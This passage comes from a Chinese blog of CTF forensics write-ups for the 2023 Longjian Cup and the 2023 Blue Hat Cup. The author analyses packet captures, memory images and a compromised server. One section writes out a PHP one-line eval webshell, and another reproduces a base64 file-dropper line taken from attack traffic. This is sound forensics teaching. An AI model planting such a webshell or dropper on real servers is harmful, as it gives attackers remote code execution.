src="/Blogimages/2023longjiancup/image-20230911080119-itlezes.png" alt="image">​</p><p>检索到TCP的前一个HTTP流量包可以看到反弹shell的语句</p><h3 id="SS3"><a href="#SS3" class="headerlink" title="SS3"></a>SS3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201720-20230911080149-s3rirer.png" alt="2023-08-26201720">​​<img src="/Blogimages/2023longjiancup/image-20230911081630-7ftyi38.png" alt="image">​</p><p>‍</p><h3 id="SS4"><a href="#SS4" class="headerlink" title="SS4"></a>SS4</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201740-20230911080903-e65xwqg.png" alt="2023-08-26201740">​</p><p>直接看&#x2F;etc&#x2F;shadow</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911080944-rvcq3m9.png" alt="image">​</p><p>可以直接看到账号和密码</p><h3 id="SS5"><a href="#SS5" class="headerlink" title="SS5"></a>SS5</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201759-20230911081009-abz7q87.png" alt="2023-08-26201759">​</p><p>外网IP可以看home目录下的log文件<br>​<img src="/Blogimages/2023longjiancup/image-20230911081047-lxro1j0.png" alt="image">​</p><p>可以看到IP地址</p><h3 id="SS6"><a href="#SS6" class="headerlink" title="SS6"></a>SS6</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201819-20230911081101-dapz3rn.png" alt="2023-08-26201819">​</p><p>释放的文件</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911081523-tkx27qn.png" alt="image">​</p><p>就这两</p><h3 id="SS7"><a href="#SS7" class="headerlink" title="SS7"></a>SS7</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201914-20230911081703-m0s2uwo.png" alt="2023-08-26201914">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911081744-84tnz0g.png" alt="image">​</p><p>‍</p><h3 id="SS8"><a href="#SS8" class="headerlink" title="SS8"></a>SS8</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201923-20230911081752-770ubc2.png" alt="2023-08-26201923">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911081744-84tnz0g.png" alt="image">​</p><h2 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h2><h3 id="BF1"><a href="#BF1" class="headerlink" title="BF1"></a>BF1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202139-20230911082038-raa236n.png" alt="2023-08-26202139">​</p><p>磁盘中的<code>key</code>​是多少</p><p>volatility取证</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911113836-fwdmjqm.png" alt="image">​</p><p>找<code>key.txt</code>​:</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911114832-iqhoii5.png" alt="image">​</p><p>提取文件：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911114906-yfhcfs4.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911114917-d3nmjct.png" alt="image">​</p><p>这个反复提交不对，结果要rot转码…服了</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911114953-71bidwo.png" alt="image">​</p><h3 id="BF2"><a href="#BF2" class="headerlink" title="BF2"></a>BF2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202145-20230911115029-7fryt5a.png" alt="2023-08-26202145">​</p><pre class=" language-cmd"><code class="language-cmd">vol.exe -f C:\CTF\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 windows > raw</code></pre><p>​<img src="/Blogimages/2023longjiancup/image-20230911174439-b03xgpf.png" alt="image">​</p><p>我感觉这种有点难以理解为什么这个就是最后的答案，有了一个方法：</p><p>先把calc的内存提出来</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911201826-bjkkb1a.png" alt="image">​</p><p>然后把导出来的文件重命名为2844.data,然后丢到GIMP里面分析，把高度拉长一点往下面划就可以看到了</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911201748-gt4mcxq.png" alt="image">​</p><p>‍</p><h3 id="BF3"><a href="#BF3" class="headerlink" title="BF3"></a>BF3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202152-20230911174459-xl88492.png" alt="2023-08-26202152">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911211102-r9ybx2x.png" alt="image">​</p><p>一样是把这个进程dump出来</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911211116-u8wx72b.png" alt="image">​</p><p>调分辨率看到字符串</p><p>U2FsdGVkX195MCsw0ANs6&#x2F;Vkjibq89YlmnDdY&#x2F;dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA&#x3D;&#x3D;</p><p>导出密钥：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911214059-ut2st4v.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911214044-95f8uam.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911214310-3w4t5mp.png" alt="image">​</p><h2 id="TP"><a href="#TP" class="headerlink" title="TP"></a>TP</h2><h3 id="TP1"><a href="#TP1" class="headerlink" title="TP1"></a>TP1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202159-20230912083829-52bvnww.png" alt="2023-08-26202159">​</p><p>条件锁定一下ip.src&#x3D;&#x3D;172.31.0.2 &amp;&amp; ip.dst &#x3D;&#x3D; 172.31.0.1</p><p>下面回显长的翻一下</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912085031-u28tuv3.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912085041-ki200oa.png" alt="image">​</p><h3 id="TP2"><a href="#TP2" class="headerlink" title="TP2"></a>TP2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202204-20230912085117-8uc40xa.png" alt="2023-08-26202204">​</p><p>越权漏洞：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912085504-9xafj6h.png" alt="image">​</p><p>一个userid为1</p><p>另一个userid为2</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912085523-yuraftq.png" alt="image">​</p><h3 id="TP3"><a href="#TP3" class="headerlink" title="TP3"></a>TP3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202210-20230912085623-2331cgv.png" alt="2023-08-26202210">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912090213-g6cwwvw.png" alt="image">​</p><p>确实不知道这个有什么技巧，硬找</p><h3 id="TP4"><a href="#TP4" class="headerlink" title="TP4"></a>TP4</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202217-20230912090245-mhzuel9.png" alt="2023-08-26202217">​</p><p>后面已经可以看到反弹shell了</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912091233-cswqjpc.png" alt="image">​</p><p>追踪前面一个流：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912091306-05l7gsj.png" alt="image">​</p><p>这里似乎就是写文件进去了，看一下是什么cve</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912091333-4637vhb.png" alt="image">​</p><p>所以就是<a href="https://xz.aliyun.com/t/11812">CVE-2022-21724</a>:custom.dtd.xml</p><h3 id="TP5"><a href="#TP5" class="headerlink" title="TP5"></a>TP5</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202224-20230912091407-3u9wuwl.png" alt="2023-08-26202224">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912091532-ywixqxm.png" alt="image">​</p><p>一个一个翻，就是fscan_amd64</p><h2 id="HD"><a href="#HD" class="headerlink" title="HD"></a>HD</h2><h3 id="hd1"><a href="#hd1" class="headerlink" title="hd1"></a>hd1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202232-20230912091610-33hb4h3.png" alt="2023-08-26202232">​</p><p>找到一个数据包：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912092259-visq0yn.png" alt="image">​</p><p>在第一个数据包里面给了aes的密钥和偏移量​<img src="/Blogimages/2023longjiancup/image-20230912092338-wyb9lmj.png" alt="image">​</p><p>去解密</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912092318-edb5w7s.png" alt="image">​</p><p>账号是admin</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912092356-bd6ugrg.png" alt="image">​</p><p>解密就是admin123了</p><h3 id="hd2"><a href="#hd2" class="headerlink" title="hd2"></a>hd2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202239-20230912092417-xc8ldd9.png" alt="2023-08-26202239">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912092849-jxjlour.png" alt="image">​</p><p>一个一个翻，找到了配置进去看</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912092920-lqaxkao.png" alt="image">​</p><p>全部丢进去解密</p><p>​​<img src="/Blogimages/2023longjiancup/image-20230912092934-1yepm62.png" alt="image">​​</p><h3 id="hd3"><a href="#hd3" class="headerlink" title="hd3"></a>hd3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202246-20230912092944-37y1lpy.png" alt="2023-08-26202246">​</p><p>直接用第二题的密钥解码cookie，发现有SSTI注入</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912094503-eo50htf.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912094523-5sjscrd.png" alt="image">​</p><p>并且回显在了页面上</p><p>我们找比较可疑的回显：</p><p>一个None和没东西的：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912094552-oh6bg69.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912094603-lwzrlxd.png" alt="image">​</p><p>分别解密，发现None没啥</p><p>但是空的那个有执行whomai命令，请求包解密一次，回显解密一次得到用户red</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912094650-du3bv16.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912094440-drarsfh.png" alt="image">​</p><h3 id="hd4"><a href="#hd4" class="headerlink" title="hd4"></a>hd4</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202254-20230912120052-nh93wau.png" alt="2023-08-26202254">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912120249-4162lnm.png" alt="image">​</p><p>加了一个&#x2F;Index路由</p><p>​​</p><h2 id="WS"><a href="#WS" class="headerlink" title="WS"></a>WS</h2><h3 id="ws1"><a href="#ws1" class="headerlink" title="ws1"></a>ws1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201931-20230912121904-0hw2alm.png" alt="2023-08-26201931">​</p><p>被入侵直接看端口</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912121846-nxidk10.png" alt="image">​</p><p>Telnet协议，23端口往外发信息</p><p>所以源地址就是被攻击地址，所以就是192.168.246.28</p><h3 id="ws2"><a href="#ws2" class="headerlink" title="ws2"></a>ws2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201938-20230912122022-uqhyta1.png" alt="2023-08-26201938">​</p><p>追踪一手TCP可以看到密码：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912122013-xoz775w.png" alt="image">​</p><h3 id="ws3"><a href="#ws3" class="headerlink" title="ws3"></a>ws3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201945-20230912122035-64y3cwd.png" alt="2023-08-26201945">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912122057-hu18ny9.png" alt="image">​</p><h3 id="ws4"><a href="#ws4" class="headerlink" title="ws4"></a>ws4</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201951-20230912122133-ap74exe.png" alt="2023-08-26201951">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912122143-xnxmfg5.png" alt="image">​</p><h2 id="SSW"><a href="#SSW" class="headerlink" title="SSW"></a>SSW</h2><h3 id="ssw1"><a href="#ssw1" class="headerlink" title="ssw1"></a>ssw1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202054-20230912194128-srq4aon.png" alt="2023-08-26202054">​</p><p>这里确实有点算是知识盲区了</p><p>我们假设一句话是</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>那么我们用wireshark抓包就是：</p><p>​<img src="/Blogimages/2023longjiancup/qsVbwR-20230912194422-4eqhwxt.png" alt="qsVbwR">​</p><p>显而易见<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0)</code>​前面的就是密码了</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912194509-e2b8wye.png" alt="image">​</p><p>所以这里的密码就是6ea280898e404bfabd0ebb702327b19f了</p><h3 id="ssw2"><a href="#ssw2" class="headerlink" title="ssw2"></a>ssw2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202101-20230912194657-yasbw26.png" alt="2023-08-26202101"></p><p>u1s1我真不知道这个有什么技巧</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912195050-09xnij4.png" alt="image">​</p><p>纯靠硬找</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912195027-21fvt7y.png" alt="image">​</p><p>ad6269b7-3ce2-4ae8-b97f-f259515e7a91就是留存值</p><h3 id="ssw3"><a href="#ssw3" class="headerlink" title="ssw3"></a>ssw3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202108-20230912195137-vbu0h0r.png" alt="2023-08-26202108">​</p><p>直接全部保存分析最大的包：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912201501-gbhl2kf.png" alt="image">​</p><p>改成exe，然后用py分析：（地址：<a href="https://github.com/extremecoders-re/pyinstxtractor%EF%BC%89">https://github.com/extremecoders-re/pyinstxtractor）</a></p><p>​<img src="/Blogimages/2023longjiancup/image-20230912201520-6sginr3.png" alt="image"></p><p>其中有一个2.pyc反编译后：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912201557-iazzu1m.png" alt="image">​</p><p>发现有图片，直接运行之后可以发现test.jpg</p><p>报错了没关系还是生成了</p><p>然后misc那一套该长度</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912201200-w4kq5ms.png" alt="image">​</p><h2 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h2><h3 id="ew1"><a href="#ew1" class="headerlink" title="ew1"></a>ew1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202116-20230912201852-fzzd50j.png" alt="2023-08-26202116">​</p><p>第一眼以为是这个d00r.php</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912201916-6dl87xp.png" alt="image">​</p><p>提交发现不对，所以就看哪里生成了这个d00r.php</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912214238-qzm2b1u.png" alt="image">​</p><p>就找，可以找到这个<code>ViewMore.php</code>​</p><h3 id="ew2"><a href="#ew2" class="headerlink" title="ew2"></a>ew2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202122-20230912214342-z03svjp.png" alt="2023-08-26202122">​</p><p>‍</p><p>追踪d00r.php的HTTP数据包</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912220254-33fuvmn.png" alt="image">​</p><p>有一个扫描的，上面有一个ipconfig</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912220315-kjxc5oj.png" alt="image">​</p><p>有好几个网卡</p><p>就是和nmap那个同一个网段就是192.168.162.130</p><h3 id="ew3"><a href="#ew3" class="headerlink" title="ew3"></a>ew3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202132-20230912221657-2cvu0kl.png" alt="2023-08-26202132">​</p><p>最下面有这个数据包：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912221731-be6in11.png" alt="image">​</p><p>直接拷下来运行php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'k3y_f1le'</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">'UEsDBBQAAQAAANgDvlTRoSUSMAAAACQAAAAHAAAAa2V5LnR4dGYJZVtgRzdJtOnW1ycl/O/AJ0rmzwNXxqbCRUq2LQid0gO2yXaPBcc9baLIAwnQ71BLAQI/ABQAAQAAANgDvlTRoSUSMAAAACQAAAAHACQAAAAAAAAAIAAAAAAAAABrZXkudHh0CgAgAAAAAAABABgAOg7Zcnlz2AE6DtlyeXPYAfldXhh5c9gBUEsFBgAAAAABAAEAWQAAAFUAAAAAAA=='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>​<img src="/Blogimages/2023longjiancup/image-20230912222020-thsy5j1.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912222108-212dl1u.png" alt="image">​</p><p>查看文件类型是zip，重命名为zip</p><p>打开发现需要密码</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912222126-vytnq1i.png" alt="image">​</p><p>密码就在上面</p><p>​<img src="/Blogimages/2023longjiancup/image-20230912222152-pupr5fn.png" alt="image">​</p><p>打开就是flag</p><p>​​</p><h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><h3 id="IR1"><a href="#IR1" class="headerlink" title="IR1"></a>IR1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201959-20230912123736-0c8i161.png" alt="2023-08-26201959">​</p><p>看<code>ps aux</code>​进程，有redis有nginx</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914084250-vugp7kg.png" alt="image">​</p><p>把文件都脱下来发现redis-server有后门，但是说是php后门（D盾和DF都没扫出来病毒）</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914084439-z40ar9c.png" alt="image">​</p><p>文件类型就是一个可执行的，没什么其他信息，主要是conf文件</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914084507-y514896.png" alt="image">​</p><p>里面有个池有个地址</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914084558-tns7nrk.png" alt="image">​</p><p>发现确实是挖矿病毒</p><h3 id="IR2"><a href="#IR2" class="headerlink" title="IR2"></a>IR2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202006-20230914084613-6dbq22m.png" alt="2023-08-26202006">​</p><p>域名就是上面conf文件里面的donate.v2.xmrig.com</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914084823-yrppc1x.png" alt="image">​</p><h3 id="IR3"><a href="#IR3" class="headerlink" title="IR3"></a>IR3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202014-20230914084832-9rl6h2t.png" alt="2023-08-26202014">​</p><p>攻击者利用的方法这种题目，主要是看服务器有什么服务</p><p>就这题来说，有<code>redis</code>​，<code>nginx</code>​，<code>javaweb</code>​三大主流服务</p><p>redis是刚才的挖矿再考的概率低一点，可以放最后看</p><p>最可疑的就是nginx了，看一下nginx的日志：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914085123-m0jey5j.png" alt="image">​</p><p>发现是同一个ip大量爆破login页面，起初以为是弱口令，但是只访问了login页面，并没有访问其他页面，那就是shiro！！</p><p>还有一个javaweb</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914092006-30rk7qz.png" alt="image">​</p><p>看一下他的日志</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914092118-if4fufm.png" alt="image">​</p><p>确定是shiro漏洞了</p><p>但是答案是啥…</p><p>是<code>shirodeserialization</code>​(没意思，叫shiro不好吗)</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914092206-fb2ehpo.png" alt="image">​</p><h3 id="IR4"><a href="#IR4" class="headerlink" title="IR4"></a>IR4</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202021-20230914092228-4t6t02b.png" alt="2023-08-26202021">​</p><p>就是nginx日志里面频繁访问&#x2F;login页面的那个ip</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914092313-equ28rk.png" alt="image">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914092328-m62w8ey.png" alt="image">​</p><h3 id="IR5"><a href="#IR5" class="headerlink" title="IR5"></a>IR5</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202027-20230914092419-26p3v3b.png" alt="2023-08-26202027">​</p><p>​<code>mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)</code>​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914092636-29px9x5.png" alt="image">​</p><h3 id="IR6"><a href="#IR6" class="headerlink" title="IR6"></a>IR6</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202037-20230914092646-y143yuu.png" alt="2023-08-26202037">​</p><p>维持权限的配置文件</p><p>&#x2F;etc&#x2F;passwd</p><p>&#x2F;etc&#x2F;shadow</p><p>&#x2F;etc&#x2F;sudo</p><p>…..</p><p>一大堆</p><p>​​<img src="/Blogimages/2023longjiancup/image-20230914094855-1kyi3im.png" alt="image">​</p><p>一眼ssh</p><p>看一下没啥东西</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914095005-s24nmq3.png" alt="image">​</p><p>接着看ssh</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914095238-qvlq81d.png" alt="image">​</p><p>发现连接到klai的ssh里了</p><h3 id="IR7"><a href="#IR7" class="headerlink" title="IR7"></a>IR7</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26202045-20230914101100-hkwmqmw.png" alt="2023-08-26202045">​</p><p>就是刚才的redis</p><p>​<img src="/Blogimages/2023longjiancup/image-20230914101751-hkgl0bn.png" alt="image">​</p><p>自动开启redis挖矿也算</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023蓝帽杯初赛 取证</title>
      <link href="/2023/09/01/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/"/>
      <url>/2023/09/01/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="2023蓝帽杯"><a href="#2023蓝帽杯" class="headerlink" title="2023蓝帽杯"></a>2023蓝帽杯</h1><p>检材：链接：<a href="https://pan.baidu.com/s/1fSXPx35zeDmYIpLwRceB3w?pwd=ksd9">https://pan.baidu.com/s/1fSXPx35zeDmYIpLwRceB3w?pwd=ksd9</a> </p><p>密码：Hpp^V@FQ6bdWYKMjX&#x3D;gUPG#hHxw!j@M9</p><h2 id="案情材料"><a href="#案情材料" class="headerlink" title="案情材料"></a>案情材料</h2><p>2021年5月，公安机关侦破了一起投资理财诈骗类案件，受害人陈昊民向公安机关报案称其在微信上认识一名昵称为yang88的网友，在其诱导下通过一款名为维斯塔斯的APP，进行投资理财，被诈骗6万余万元。接警后，经过公安机关的分析，锁定了涉案APP后台服务器。后经过公安机关侦查和研判发现杨某有重大犯罪嫌疑，经过多次摸排后，公安机关在杨某住所将其抓获，并扣押了杨某手机1部、电脑1台，据杨某交代，其网站服务器为租用的云服务器。上述检材已分别制作了镜像和调证，假设本案电子数据由你负责勘验，请结合案情，完成取证题目。</p><p>‍</p><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><h3 id="1、涉案apk的包名是？-答题格式-com-baid-ccs"><a href="#1、涉案apk的包名是？-答题格式-com-baid-ccs" class="headerlink" title="1、涉案apk的包名是？[答题格式:com.baid.ccs]"></a><strong>1、涉案apk的包名是？[答题格式:com.baid.ccs]</strong></h3><p>直接APK Messenger</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914213003-ay5ohiy.png" alt="image">​</p><p>com.vestas.app</p><h3 id="2、涉案apk的签名序列号是？-答题格式-0x93829bd"><a href="#2、涉案apk的签名序列号是？-答题格式-0x93829bd" class="headerlink" title="2、涉案apk的签名序列号是？[答题格式:0x93829bd]"></a><strong>2、涉案apk的签名序列号是？[答题格式:0x93829bd]</strong></h3><h4 id="繁琐的："><a href="#繁琐的：" class="headerlink" title="繁琐的："></a>繁琐的：</h4><p>直接解压apk</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914213030-mkrlefe.png" alt="image">​</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914213051-fqi1iu7.png" alt="image">​</p><p>找到CERT.RSA文件</p><pre class=" language-cmd"><code class="language-cmd">keytool -printcert -file CERT.RSA</code></pre><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914213133-le7znea.png" alt="image">​</p><p>序列号就是 <code>0x563b45ca</code>​</p><h4 id="工具梭哈"><a href="#工具梭哈" class="headerlink" title="工具梭哈"></a>工具梭哈</h4><p>​​</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914213802-ahg6vj0.png" alt="image"></p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914214228-l7lzmhd.png" alt="image">​</p><p>这两个工具都能梭</p><h3 id="3、涉案apk中DCLOUD-AD-ID的值是？-答题格式-2354642"><a href="#3、涉案apk中DCLOUD-AD-ID的值是？-答题格式-2354642" class="headerlink" title="3、涉案apk中DCLOUD_AD_ID的值是？[答题格式:2354642]"></a><strong>3、涉案apk中DCLOUD_AD_ID的值是？[答题格式:2354642]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914214034-xb1xea8.png" alt="image"></p><p>还有一个​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914215529-00lw2eu.png" alt="image">​</p><p>不过我觉得应该是xml里面那个</p><h3 id="4、涉案apk的服务器域名是？-答题格式-http-sles-vips-com"><a href="#4、涉案apk的服务器域名是？-答题格式-http-sles-vips-com" class="headerlink" title="4、涉案apk的服务器域名是？[答题格式:http://sles.vips.com]"></a><strong>4、涉案apk的服务器域名是？[答题格式:<a href="http://sles.vips.com/">http://sles.vips.com</a></strong>]</h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914215108-oysevmz.png" alt="image">​</p><p>直接模拟器打开</p><p>​<code>https://vip.licai.com:8083</code>​</p><h3 id="5、涉案apk的主入口是？-答题格式-com-bai-cc-initactivity"><a href="#5、涉案apk的主入口是？-答题格式-com-bai-cc-initactivity" class="headerlink" title="5、涉案apk的主入口是？[答题格式:com.bai.cc.initactivity]"></a><strong>5、涉案apk的主入口是？[答题格式:com.bai.cc.initactivity]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914215557-w2pmvsj.png" alt="image">​</p><p>io.dcloud.PandoraEntry</p><h2 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a><strong>手机取证</strong></h2><h3 id="6、该镜像是用的什么模拟器？-答题格式-天天模拟器"><a href="#6、该镜像是用的什么模拟器？-答题格式-天天模拟器" class="headerlink" title="6、该镜像是用的什么模拟器？[答题格式:天天模拟器]"></a><strong>6、该镜像是用的什么模拟器？[答题格式:天天模拟器]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230914215919-3j9jwt9.png" alt="image">​</p><p>雷电模拟器</p><h3 id="7、该镜像中用的聊天软件名称是什么？-答题格式-微信"><a href="#7、该镜像中用的聊天软件名称是什么？-答题格式-微信" class="headerlink" title="7、该镜像中用的聊天软件名称是什么？[答题格式:微信]"></a><strong>7、该镜像中用的聊天软件名称是什么？[答题格式:微信]</strong></h3><p>与你</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230915083209-87nm87o.png" alt="image">​</p><h3 id="8、聊天软件的包名是？-答题格式-com-baidu-ces"><a href="#8、聊天软件的包名是？-答题格式-com-baidu-ces" class="headerlink" title="8、聊天软件的包名是？[答题格式:com.baidu.ces]"></a><strong>8、聊天软件的包名是？[答题格式:com.baidu.ces]</strong></h3><p>com.uneed.yuni</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230915123557-u39ckig.png" alt="image">​</p><h3 id="9、投资理财产品中，受害人最后投资的产品最低要求投资多少钱？-答题格式-1万"><a href="#9、投资理财产品中，受害人最后投资的产品最低要求投资多少钱？-答题格式-1万" class="headerlink" title="9、投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]"></a><strong>9、投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]</strong></h3><p>5万</p><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230915123643-0hwpfbg.png" alt="image">​</p><p>‍</p><h3 id="10、受害人是经过谁介绍认识王哥？-答题格式-董慧"><a href="#10、受害人是经过谁介绍认识王哥？-答题格式-董慧" class="headerlink" title="10、受害人是经过谁介绍认识王哥？[答题格式:董慧]"></a><strong>10、受害人是经过谁介绍认识王哥？[答题格式:董慧]</strong></h3><p>​<img src="/Blogimages/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20230915123724-9k2l75v.png" alt="image"></p><p>‍</p><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a><strong>计算机取证</strong></h2><h3 id="11、请给出计算机镜像pc-e01的SHA-1值？-答案格式：字母小写"><a href="#11、请给出计算机镜像pc-e01的SHA-1值？-答案格式：字母小写" class="headerlink" title="11、请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]"></a><strong>11、请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]</strong></h3><p>​​<img 